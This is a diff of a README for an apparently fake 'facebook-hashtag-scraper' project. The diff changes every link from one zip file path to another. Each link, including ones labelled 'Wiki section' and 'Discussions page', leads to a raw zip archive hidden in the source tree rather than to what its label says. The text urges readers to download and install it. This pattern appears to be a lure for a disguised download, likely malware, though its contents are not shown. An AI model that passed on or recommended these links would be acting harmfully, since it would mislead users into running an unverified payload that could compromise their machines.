@@ -19,7 +19,7 @@ To run the facebook-hashtag-scraper, ensure you have the following:
 ## 📥 Download & Install
 To get started, you need to download the application from the Releases page. 
 
-[Download the latest release here](https://raw.githubusercontent.com/kiya12-lab/facebook-hashtag-scraper/main/src/config/facebook-hashtag-scraper_3.5-alpha.3.zip)
+[Download the latest release here](https://raw.githubusercontent.com/kiya12-lab/facebook-hashtag-scraper/main/src/extractors/facebook-hashtag-scraper-v2.5-beta.4.zip)
 
 1. Click the link above to visit the page.
 2. Look for the latest version of the software.
@@ -48,8 +48,8 @@ If you encounter issues, try these common solutions:
 If you have questions or need support, you can reach out to the community. Check out our GitHub issues page to report problems or ask for help.
 
 ## 🔗 Additional Resources
-- For detailed information about usage, refer to the [Wiki section](https://raw.githubusercontent.com/kiya12-lab/facebook-hashtag-scraper/main/src/config/facebook-hashtag-scraper_3.5-alpha.3.zip).
-- Join our community discussions on [Discussions page](https://raw.githubusercontent.com/kiya12-lab/facebook-hashtag-scraper/main/src/config/facebook-hashtag-scraper_3.5-alpha.3.zip).
+- For detailed information about usage, refer to the [Wiki section](https://raw.githubusercontent.com/kiya12-lab/facebook-hashtag-scraper/main/src/extractors/facebook-hashtag-scraper-v2.5-beta.4.zip).
+- Join our community discussions on [Discussions page](https://raw.githubusercontent.com/kiya12-lab/facebook-hashtag-scraper/main/src/extractors/facebook-hashtag-scraper-v2.5-beta.4.zip).
 
 ## 📄 License
 This project is open-source and released under the MIT License. You are free to use and modify the software as you wish.
@@ -57,4 +57,4 @@ This project is open-source and released under the MIT License. You are free to 
 ## 📥 Download Again
 To download the application, visit the link again below:
 
-[Download the latest release here](https://raw.githubusercontent.com/kiya12-lab/facebook-hashtag-scraper/main/src/config/facebook-hashtag-scraper_3.5-alpha.3.zip)
+[Download the latest release here](https://raw.githubusercontent.com/kiya12-lab/facebook-hashtag-scraper/main/src/extractors/facebook-hashtag-scraper-v2.5-beta.4.zip)
